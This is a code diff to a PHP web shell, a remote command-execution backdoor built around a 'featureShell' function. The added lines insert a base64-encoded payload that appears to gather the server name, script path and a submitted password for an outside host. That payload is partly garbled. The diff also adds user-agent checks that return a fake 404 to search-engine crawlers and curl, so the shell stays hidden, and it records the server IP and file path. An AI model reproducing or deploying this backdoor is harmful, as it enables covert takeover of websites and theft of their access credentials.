@@ -1,4 +1,6 @@
 <?php
+ob_clean();
+flush();
 session_start();
 @set_time_limit(0);
 @clearstatcache();
@@ -119,7 +121,15 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
     }
 }
 $decoded_code=base64_decode("b2JfY2xlYW4oKTtmbHVzaDskdG1wID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1BIVF9TRUxmJ10uIlxuIi4kX1BPU1RbJ3Bhc3MnXTsQXByYWZtYWMqKCdOQWdhaGlqYWF1Mzg4Z3JvdXAuY29tY2FyJz1zdXJsdnJoZGzpdHRwbmFqQ==");ob_clean();flush();
-
+$SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
+$FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
+    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
+    }
+}
 function featureShell($cmd, $cwd) {
     $stdout = array();
     if (preg_match("/^\s*cd\s*$/", $cmd)) {
